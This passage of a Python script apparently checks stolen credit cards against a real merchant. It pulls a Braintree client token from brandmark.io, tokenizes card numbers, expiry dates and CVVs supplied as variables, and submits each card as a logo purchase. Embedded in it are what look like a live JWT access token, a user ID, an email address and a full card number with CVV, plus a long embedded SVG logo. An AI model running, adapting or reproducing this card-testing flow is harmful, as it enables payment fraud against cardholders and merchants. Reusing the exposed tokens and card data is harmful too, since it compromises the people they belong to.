Zk4JTNibXUMbf7uhdqp9LwH5S8JY1Bn/euOfAlG2XC3BaEO385sJsUSGbByNDGWaObFD4etQTamfyt4HUz292cwy1OnPoTKA6kLpul86nqOnCsL8CdE6BOiN9ofAVX/N2m+MB71eWtN1Id+nWAx6i8BrfSNbXiKcl9UXy0qQWT8ccSo9F6aPUwmqdhnDm2AaW/DyDA2wo4ybz4G2Pk6GNSJP8g1548Zy9Jn9r0Bh45ESZZuF2xKWYypskS5K05QbKO7gSC/CR/8A7QdNqsKAs8TE2FkXco0ZwPM7OoWd1GFJtWHHZDvHgEPVfbTlWnOUBjBj+2IJmVKUEn5Sj33uZoL7RmJx/ay80bFrapzICI/doVtwR+77aAHERr8Fky5tpkKBzxDO2MN7wKqFctz4v2KPzZy4vBetRdaeI2d0ksHQam27LlCIjEXPPn5Ojyo2K7EvixX34ebQvOgxxiU0qsxdAZlp+CaP9GSQyiasdsja3p+xYCvD/y+ea9sGKmLwAnrogX8MpwWEx57OF3YBg36YcHoQxjvY07GIPztthnwoOs16suq8voQjsqBr9mvPhDNDXT0me5UQ9VOXutil6lUjYIDToD870EHhWYdvx4ADwn00xDlOrZGi6dInLqh/ssDBH7g+EKCSMFjKkhKL8Dx6C8RoVsCfUXsKuGIzaVSZjY0Z35quBobePXzJaaWW6NpRHX+IkIHLuUIcJgwxK44v//WdMugG+6eFha8YJAWlDxLeeWA/D+WPp8SItsdVLZVyzMtDVnWVAhJreVhjMzu8DYj0YLdfWsgxqpezT7bhWXYgwmHEeIw9rUEB43ma8YxdiyUiYTmUhSbwZ4q3KrLMwtxc0kLnY/SGKSj63NuMzi8QddMT9FFtgwDSru2YZAKIeO7D+r2hBq4IaW6RzydhsBiKNrjCCEg3E/AvJQo9CkIq46HPi0dc2DYG8eYjNzCN58K/Z6FF3FwEINz6lnfHTv3ah13ALr6OC9MVhboGnI9wpx2Z8q5p/vM56Guw02e72qP38N1hv+66+UfRerrDJhTUCr+H37+AlUIC3K85QBH9uQUBjFhHsKkWiJ87ET7mHAXc4nwpruNokWMJAja+FXw37GAv4n1ZFhdawqOk7uAlwlL/5UtMpfNMZeFyvA5VQR1UOeI8OIFzxR6Ayb3WcV+4QQC/B0aD3rmJGvlgQHudvFusOlKOwntShk/nPNf9007pSBVCxqvYIikVNU91svgD8W/4LlZ6vT6ontk9KydlQ+NkTkmE9cCNisy2fwC/PqyIvqPewfwvi2v6klnJXJcBnnHFgd3nrlzRTW2fFprdxq08bIeW+Xhhy/k6xX1Kvofcu1G5ELkNPTVI+dp7LYRSmRYzlP7W2u4/G/ambeyketEZmPDv0p5DdkgeT4UvoxY7tQmQpmgTiie8XF6iZ5moOoD8SUNB5HYgP1mkrVatnaEhAM9WThzIrv/jWg7978kINxaG69+miXqxdaoTr3AiB7W0j/5DHSc59Gsd7uwkw1Af9eLs/WQ5B=","user_id":"Qb7eJOxZFVc4bIXxFkRzRPZSbko2","access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjgwNzhkMGViNzdhMjdlNGUxMGMzMTFmZTcxZDgwM2I5MmY3NjYwZGYiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVkJGIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0laRlpBMlFaSGZSN044b0JtZ1phZV9aM0VCYzU0LUpzLU8taUJQUmRQQ0oyVkdrdz1zOTYtYyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9icmFuZG1hcmstaW8iLCJhdWQiOiJicmFuZG1hcmstaW8iLCJhdXRoX3RpbWUiOjE3MTIxODQwNjIsInVzZXJfaWQiOiJRYjdlSk94WkZWYzRiSVh4RmtSelJQWlNia28yIiwic3ViIjoiUWI3ZUpPeFpGVmM0YklYeEZrUnpSUFpTYmtvMiIsImlhdCI6MTcxMjE4NDA2MiwiZXhwIjoxNzEyMTg3NjYyLCJlbWFpbCI6InZpc2FzcGFtNzdAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZ29vZ2xlLmNvbSI6WyIxMTIxOTU0NzY2ODEzMjczNDQ4NjciXSwiZW1haWwiOlsidmlzYXNwYW03N0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJnb29nbGUuY29tIn19.FqQOaL5Gh7p4QjqaTy6G0trQ2QLnonYQg27egGs4nOkD66MVbUSNDsYwUvD709AW42m7Jij3ijEzpB5ReztYHOyUP7SzMe9pTaJaU8gyOkUe_LRwCCL4kG-kRf3helMjgyscyNmZ-XfevHceKDkN45p8EYaJsROl_xGgeBG6eGYGf0rDx9Rn_y209PsPd1ewsep4YsfvEBOEVVJUZNBq3l2xZhiV7lEcLj4ZmYzmbyxub276XMe0la2gVS1WNQZ6zvYsvcV8dcdowT_M18wCw5jNiLtFRGWKGzsPaQrl8SfZD6hHHGqhokJcl8fqbaHFf3ohzT8Jejq71SXSaGwrpQ"}'
	#response = requests.post('https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, data=data)
	ui=(response.json()["client_token"])
	import base64,re
	decoded_text = base64.b64decode(ui).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '593edb4c-8938-4b0f-8102-0c4c42431442',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"593edb4c-8938-4b0f-8102-0c4c42431442"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111010040322004","expirationMonth":"05","expirationYear":"2024","cvv":"327"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	    '_ga': 'GA1.2.197546107.1712183919',
	    '_gid': 'GA1.2.421236434.1712183919',
	    '_gat': '1',
	    '_ga_93VBC82KGM': 'GS1.2.1712183920.1.1.1712184300.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.197546107.1712183919; _gid=GA1.2.421236434.1712183919; _gat=1; _ga_93VBC82KGM=GS1.2.1712183920.1.1.1712184300.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'tier': 'basic',
	    'email': 'visaspam77@gmail.com',
	    'payload': {
	        'nonce': tok,
	        'details': {
	            'expirationMonth': '05',
	            'expirationYear': '2024',
	            'bin': '511101',
	            'cardType': 'MasterCard',
	            'lastFour': '2004',
	            'lastTwo': '04',
	        },
	        'type': 'CreditCard',
	        'description': 'ending in 04',
	        'deviceData': '{"device_session_id":"369d25c118a94b4af4898934afbf19ea","fraud_merchant_id":null,"correlation_id":"0be80c371e069d8cb472c466df18de2b"}',
	        'binData': {
	            'prepaid': 'Yes',
	            'healthcare': 'No',
	            'debit': 'Yes',
	            'durbinRegulated': 'No',
	            'commercial': 'Unknown',
	            'payroll': 'No',
	            'issuingBank': 'OPTUM BANK, INC.',
	            'countryOfIssuance': 'USA',
	            'productId': 'MPY',
	        },
	    },
	    'discount': False,
	    'referral': None,
	    'params': {
	        'id': 'logo-b820964b-953a-4d95-bfc4-39d571a86f9f',
	        'layout': 2,
	        'title': 'MORE',
	        'titleFamily': 'Montserrat Light Alt1',
	        'titleVariant': '300',
	        'titleColor': [
	            {
	                'hex': '#bdbbb3',
	            },
	        ],
	        'titleScale': 2.5,
	        'titleLetterSpace': 0,
	        'titleLineSpace': 1.1,
	        'titleBoldness': 0,
	        'titleX': 0,
	        'titleY': 0,
	        'titleAlign': 'center',
	        'slogan': '',
	        'sloganFamily': 'Fira Sans Condensed',
	        'sloganVariant': '300italic',
	        'sloganColor': [
	            {
	                'hex': '#bdbbb3',
	            },
	        ],
	        'sloganScale': 2.5,
	        'sloganLetterSpace': 0,
	        'sloganLineSpace': 1.1,
	        'sloganBoldness': 0,
	        'sloganAlign': 'center',
	        'sloganX': 0,
	        'sloganY': 0,
	        'icon': {
	            'type': 'noun',
	            'id': 1016970,
	            'preview': 'https://app.brandmark.io/nounpreview/1016970.png',
	        },
	        'showIcon': True,
	        'iconScale': 1,
	        'iconColor': [
	            {
	                'hex': '#6e6d66',
	            },
	        ],
	        'iconContainer': None,
	        'showIconContainer': False,
	        'iconContainerScale': 1,
	        'iconContainerColor': [
	            {
	                'hex': '#3a3934',
	            },
	        ],
	        'iconSpace': 1,
	        'iconX': 0,
	        'iconY': 0,
	        'nthChar': 1,
	        'container': None,
	        'showContainer': False,
	        'containerScale': 1,
	        'containerColor': [
	            {
	                'hex': '#3a3934',
	            },
	        ],
	        'containerX': 0,
	        'containerY': 0,
	        'backgroundColor': [
	            {
	                'hex': '#201f1c',
	            },
	        ],
	        'palette': [
	            '#201f1c',
	            '#bdbbb3',
	            '#a2a199',
	            '#88877f',
	            '#6e6d66',
	        ],
	        'keywords': [
	            'more',
	            'auth',
	        ],
	    },
	    'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg622393" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata622399">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs622397"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-b820964b-953a-4d95-bfc4-39d571a86f9f">\n    <stop id="stop622374" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop622376" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-b820964b-953a-4d95-bfc4-39d571a86f9f">\n    <stop id="stop622379" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop622381" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop622383" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" transform="translate(0 0)" style="display: none;"></image>\n    <g id="logo-center" transform="translate(5.684341886080802e-14 0)">\n      <image xlink:href="" id="icon_container" style="display: none;"></image>\n      <g id="slogan" style="font-style:oblique;font-weight:300;font-size:32px;line-height:1;font-family:\'Fira Sans Condensed\';font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)"></g>\n      <g id="title" style="font-style:normal;font-weight:300;font-size:72px;line-height:1;font-family:\'Montserrat Light Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)">\n        <path id="path622402" style="font-style:normal;font-weight:300;font-size:72px;line-height:1;font-family:\'Montserrat Light Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 453.83862,0 h 3.6 l -0.072,-50.4 h -3.024 l -22.536,38.952 -22.536,-38.952 h -3.096 V 0 h 3.60001 v -42.984 l 21.096,36.288 h 1.79999 l 21.096,-36.432 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#bdbbb3" stroke="#bdbbb3" transform="translate(0 346.24) translate(249.63051976439795 -25.240000000000002) scale(2.5) translate(-406.17462 50.4)"></path>\n        <path id="path622404" style="font-style: normal; font-weight: 300; font-size: 72px; line-height: 1; font-family: &quot;Montserrat Light Alt1&quot;; font-variant-ligatures: none; text-align: center; text-anchor: middle; display: none;" d="m 482.93225,-2.952 c 3.96,2.232 8.424,3.312 13.392,3.312 4.896,0 9.36,-1.08 13.392,-3.312 3.96,-2.16 7.056,-5.256 9.36,-9.144 2.304,-3.888 3.456,-8.208 3.456,-13.104 0,-4.824 -1.152,-9.216 -3.456,-13.104 -2.304,-3.888 -5.4,-6.912 -9.36,-9.144 -4.032,-2.16 -8.496,-3.312 -13.392,-3.312 -4.968,0 -9.432,1.152 -13.392,3.384 -4.032,2.232 -7.128,5.256 -9.432,9.144 -2.304,3.888 -3.384,8.28 -3.384,13.032 0,4.824 1.08,9.144 3.384,13.032 2.304,3.888 5.4,6.984 9.432,9.216 z m 24.84,-2.952 c -3.456,1.944 -7.272,2.88 -11.448,2.88 -4.248,0 -8.064,-0.936 -11.52,-2.88 -3.456,-1.872 -6.12,-4.536 -8.064,-7.92 -2.016,-3.384 -2.952,-7.2 -2.952,-11.376 0,-4.176 0.936,-7.92 2.952,-11.304 1.944,-3.384 4.608,-6.048 8.064,-7.992 3.456,-1.872 7.272,-2.88 11.52,-2.88 4.176,0 7.992,1.008 11.448,2.88 3.384,1.944 6.048,4.608 8.064,7.992 1.944,3.384 2.952,7.128 2.952,11.304 0,4.176 -1.008,7.992 -2.952,11.376 -2.016,3.384 -4.68,6.048 -8.064,7.92 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#bdbbb3" stroke="#bdbbb3"></path>\n        <path id="path622406" style="font-style:normal;font-weight:300;font-size:72px;line-height:1;font-family:\'Montserrat Light Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 561.83637,-17.64 c 3.744,-1.08 6.696,-2.952 8.712,-5.688 2.01601,-2.736 3.096,-6.048 3.096,-10.08 0,-5.256 -1.79999,-9.432 -5.4,-12.456 -3.6,-3.024 -8.568,-4.536 -14.904,-4.536 h -18.072 v 3.312 h 18.072 c 5.328,0 9.432,1.224 12.312,3.6 2.808,2.376 4.248,5.76 4.248,10.08 0,4.392 -1.44,7.776 -4.248,10.152 -2.88,2.376 -6.984,3.528 -12.312,3.528 h -18.072 V 0 h 3.67201 v -16.488 h 14.39999 c 1.44001,0 3.096,-0.072 4.896,-0.36 L 570.26037,0 h 4.176 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#bdbbb3" stroke="#bdbbb3" transform="translate(0 346.24) translate(563.1029052356021 -25.240000000000002) scale(2.5) translate(-535.26837 50.4)"></path>\n        <path id="path622408" style="font-style:normal;font-weight:300;font-size:72px;line-height:1;font-family:\'Montserrat Light Alt1\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 619.775,-27.216 h -32.616 v 3.24 h 32.616 z m 0,-23.184 h -32.616 v 3.312 h 32.616 z M 587.159,-3.312 V 0 h 32.616 v -3.312 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#bdbbb3" stroke="#bdbbb3" transform="translate(0 346.24) translate(692.829480235602 -25.240000000000002) scale(2.5) translate(-587.159 50.4)"></path>\n      </g>\n      <image xlink:href="data:image/png;base64,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